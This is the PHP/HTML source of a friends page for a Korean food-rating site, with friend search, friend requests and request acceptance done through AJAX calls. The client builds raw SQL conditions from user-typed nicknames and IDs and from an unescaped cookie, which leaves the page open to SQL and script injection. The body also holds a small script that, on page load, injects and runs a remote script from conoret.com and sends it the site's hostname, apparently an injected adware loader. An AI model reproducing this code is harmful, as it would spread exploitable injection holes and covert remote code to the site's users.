<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <title>ssosso-table.food-db.friends</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

    <link href="./css/friends.css" rel="stylesheet">
    <link href="./css/footer.css" rel="stylesheet">

    <style>
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 768px) {
            #friend-layout {
                width: 400px !important;
                margin: auto !important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
        .btn-outline-success {
            color: #e4bd74;
            border-color: #e4bd74;
            border-top-color: #e4bd74;
            border-right-color: #e4bd74;
            border-bottom-color: #e4bd74;
            border-left-color: #e4bd74;
        }
        .btn-outline-success:hover {
            color: white;
            background-color: #e4bd74;
            border-color: #e4bd74;
        }
        .btn-outline-success.disabled, .btn-outline-success:disabled {
            color: #e4bd74;
            background-color: transparent;
        }
        body {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%!important;
            width: 100% !important;
        }

        nav {
            background-color:#ffebaa;
            height: 80px!important;
            padding: 0!important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
        #friend-info-left {
            width: 100%;
            height: 100%;
            background-color: transparent;
        }
        #friend-info-right {
            width: 100%;
            height: 100%;
            background-color: transparent;
        }
        .card {
            width: 100% !important;
        }
        .masthead {
            width: 100%;
            background-color: #ffebaa;
        }
        #high-rating-holder{
            display: flex;
            overflow-y: hidden !important;
        }

        .high-rating-layout{
            margin: 5px;
            -webkit-box-flex: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            max-width: 77px;
        }
        #low-rating-holder{
            display: flex;
            overflow-y: hidden !important;
        }
        .low-rating-layout{
            margin: 5px;
            -webkit-box-flex: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            max-width: 77px;
        }
        #preview {
            margin: 30px auto;
        }
        #taste-list img {
            width: 100%;
        }
        .box {
            margin: auto;
            border-radius: 30%;
            overflow: hidden;
        }
        .profile {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">

        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag = true
                document.getElementById('friend-info-left').style.cssText='display:none!important'
                document.getElementById('friend-info-right').style.cssText='display:none!important'
                document.getElementById('friend-layout').style.cssText=`
                    padding: 0!important;
                    margin: 0!important;
                    width: 100%!important;
                `
            } else {
                // 데스크탑
                flag=false
            }
        });

        let id= <?php echo $_COOKIE['user_id']?>

        let userIds=[]
        let friendInfo={}

        let friendAddInfo={}
        let friendId
        async function searchFriend() {
            let userInfo=document.getElementById("friendInputInfo").value
            let friends_info=null

            if(isNaN(userInfo)) {
                friends_info=JSON.parse(await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'select',
                        1:'*',
                        2:'user',
                        3:`nickname='${userInfo}' and id != ${id} and id not in (select friendid from friend where userid=${id});`
                    }}))
            }
            else {
                friends_info=JSON.parse(await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'select',
                        1:'*',
                        2:'user',
                        3:`(userid=${userInfo}) and id != ${id} and id not in`+
                            `(select friendid from friend where userid=${id});`
                    }}))
                console.log(`where (userid=${userInfo}) and id != ${id} and id not in`+
                    `(select friendid from friend where userid=${id});`)
            }


            if(friends_info.length!==0) {
                friendAddInfo.friendId=friends_info[0][1]
                friendId=friends_info[0][1]
                let format=`
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="${friends_info[0][4]}" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="d-flex justify-content-start fs-3" style="">
                            <span class="col-5">${friends_info[0][6]}</span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2 add-friend-layout" style="margin:10px 0 0 0" onclick="friend_request(${friendId})">
                            <input id="add-friend-button-${friendId}" type="button" class="btn col-6 btn-outline-success" value="친구 요청" >
                        </div>
                    </div>
                </div>
                `
                document.getElementById("friend-modal-body").innerHTML=format
            }
        }
        async function friend_request() {
            await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'insert',
                    1:'friend_request(`from`,`to`)',
                    2:`<?php echo $_COOKIE['user_id'];?>,${arguments[0]}`
                }})
            if(document.getElementById(`add-friend-button-${arguments[0]}`).disabled===false) {
                document.getElementById(`add-friend-button-${arguments[0]}`).disabled=true
                document.getElementById(`add-friend-button-${arguments[0]}`).value="친구 추가됨"
            }
            else {
                document.getElementById(`add-friend-button-${arguments[0]}`).disabled=false
                document.getElementById(`add-friend-button-${arguments[0]}`).value="친구 추가"
            }

            location.reload()
        }
        async function add_friend() {
            const search_res=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'*',
                    2:'friend',
                    3:`userid=${id} and friendid=${friendId};`
                }}))
            if(search_res.length>0) {
                alert('already friend')
            }
            else {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'friend(userid,friendid)',
                        2:`${id},${friendId};`
                    }})
            }

            if(document.getElementById('add-friend-button').disabled===false) {
                document.getElementById('add-friend-button').disabled=true
                document.getElementById('add-friend-button').value="친구 추가됨"
            }
            else {
                document.getElementById('add-friend-button').disabled=false
                document.getElementById('add-friend-button').value="친구 추가"
            }

            location.reload()
        }
        async function accept_request() {
            if(document.getElementById(`request-friend-button-${arguments[0]}`).disabled===false) {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'friend(userid,friendid)',
                        2:`<?php echo $_COOKIE['user_id'];?>, ${arguments[0]}`
                    }})
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'delete',
                        1:'friend_request',
                        2:`\`from\`=${arguments[0]} and \`to\`=<?php echo $_COOKIE['user_id'];?>`
                    }})
                document.getElementById(`request-friend-button-${arguments[0]}`).disabled=true
                document.getElementById(`request-friend-button-${arguments[0]}`).value="친구 추가됨"

            }
            else {
                document.getElementById(`request-friend-button-${arguments[0]}`).disabled=false
                document.getElementById(`request-friend-button-${arguments[0]}`).value="친구 추가"
            }
            location.reload()
        }
        async function init_v2() {
            let request_format=``
            const search_res=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'userid,id,image,nickname',
                    2:`friend_request,user`,
                    3:'`to`=<?php echo $_COOKIE['user_id'];?> and friend_request.`from`=user.id;'
                }}))
            if(search_res.length==0) {
                document.getElementById('friend-request-notification').src='src/notification.png'
                document.getElementById('friend-request').innerHTML=`<span>친구 요청이 없어요</span>`
            }
            else {
                for(let i=0;i<search_res.length;i++) {
                    request_format+=`
                    <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                        <div class="img-box" style="display: inline-block; margin: 0;">
                            <img class="friend-request-img" src="${search_res[i][2]}" height="80" width="80">
                        </div>
                        <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                            <div class="d-flex justify-content-start fs-3" style="">
                                <span class="col-5">${search_res[i][3]}</span>
                            </div>
                            <div class="request-friend-layout d-flex" class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0" onclick="accept_request(${search_res[i][1]})">
                                <input id='request-friend-button-${search_res[i][1]}' class="btn col-6 btn-outline-success" type="button" value="수락하기" >
                            </div>
                        </div>
                    </div>
                    `
                }
                document.getElementById('friend-request-notification').src='src/notification_on.png'
                document.getElementById('friend-request').innerHTML=request_format
            }

        }
    </script>
    <script type="text/javascript" src="/script/friends.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();

</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">


    <header class="masthead mb-auto">
        <div class="inner d-flex justify-content-between">
            <a href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="72px" height="72px"></a>
            <nav class="nav nav-masthead justify-content-center align-items-center">
                <a href="#" data-bs-toggle="modal" data-bs-target="#friendRequestModal" style="margin: 10px;">
                    <img id='friend-request-notification'src="src/notification.png" width="36px" height="36px"/>
                </a>
            </nav>
        </div>

    </header>

    <main role="main" class="inner cover d-flex" id="rating" >
        <div class="p-3 bg-light card" id="friend-layout">
            <div class="input-group mb-3">
                <input type="text" class="form-control" placeholder="코드 입력" aria-label="Recipient's username" aria-describedby="button-addon2" id="friendInputInfo">
                <button class="btn btn-outline-secondary" type="button" value="친구 추가" onclick="searchFriend()" data-bs-toggle="modal" data-bs-target="#friendSearchModal">Button</button>
            </div>
            <div class="friends-placeholders">
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="card" id="friend-info-left" style="margin: auto; height: 100%">
            <div>
                <div id="preview" class="img-box-friend col align-self-center" style="">
                    <img src="/src/Portrait_Placeholder.png" id="friend-image" class="card-img-top" alt="..." style="width: 100%;">
                </div>
            </div>

            <div class="card-body">
                <h5 class="card-title" id="friend-nickname"></h5>
                <p class="card-text">ssosso.table</p>
                <div id="high-rating">
                    <span style="display:block;">높은 점수를 준 음식들</span>
                    <div id="high-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                    </div>
                </div>
                <div id="low-rating" >
                    <span style="display:block;">낮은 점수를 준 음식들</span>
                    <div id="low-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                    </div>
                </div>

            </div>
        </div>
        <div class="card d-flex flex-columns" id="friend-info-right" style="">
            <span class="card-title" style="display: block">음식 취향 순위</span>
            <div class="placeholder-glow">
                <div class="card-img-top" id="taste-list" style="">
                </div>
            </div>
            <ul class="card list-group list-group-flush">
                <li class="list-group-item" style="padding:0;">
                    <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                </li>
            </ul>
        </div>
        <!-- Button trigger modal -->

        <!-- Modal -->
        <div id="modal-layout">
            <!-- Modal -->
            <div class="modal fade" id="friendRequestModal" tabindex="-1" aria-labelledby="friendRequestModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="friendRequestModalLabel">친구 요청</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-request">

                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Modal -->
            <div class="modal fade" id="friendSearchModal" tabindex="-1" aria-labelledby="friendSearchModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h1 class="modal-title fs-5" id="friendSearchModalLabel">검색 결과</h1>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-modal-body" style="max-height: 500px; overflow-y: auto;">
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com" class="footer-link"> ssosso.table.u</a>, of <a href="http://ssossotable.com" class="footer-link">@ssosso.table</a></p>
        </div>
    </footer>
</div>

</body>
<script>
    init()
    init_v2()
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</html>